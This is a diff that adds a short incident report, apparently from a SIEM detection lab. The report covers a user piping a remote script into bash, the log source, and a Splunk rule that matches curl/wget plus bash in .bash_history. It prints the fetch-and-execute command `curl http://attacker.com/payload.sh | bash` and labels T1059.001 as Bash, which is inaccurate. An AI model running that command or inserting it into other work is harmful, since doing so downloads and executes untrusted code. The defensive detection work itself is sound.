@@ -1,0 +1,40 @@
+
+---
+
+## 📄 `incident-report.txt`
+
+```txt
+==========================
+🛡️ INCIDENT REPORT – T1059.001
+==========================
+
+📅 Date: June 8, 2025  
+👤 User: testuser  
+📍 Host: siem-server  
+📘 MITRE Technique: T1059.001 – Bash
+
+---
+
+🧪 Summary of Events:
+- The user `testuser` executed a command that piped content from a remote source into `bash`
+- Command: `curl http://attacker.com/payload.sh | bash`
+
+---
+
+📄 Log Source:
+- /home/testuser/.bash_history
+
+---
+
+🔍 Detection Method:
+- Searched for `.bash_history` entries containing `curl`/`wget` and `bash`
+- Alerted via Splunk scheduled alert
+
+---
+
+📌 Outcome:
+✅ Alert created  
+✅ Triggered log event  
+✅ Ready for escalation or automation
+
+==========================
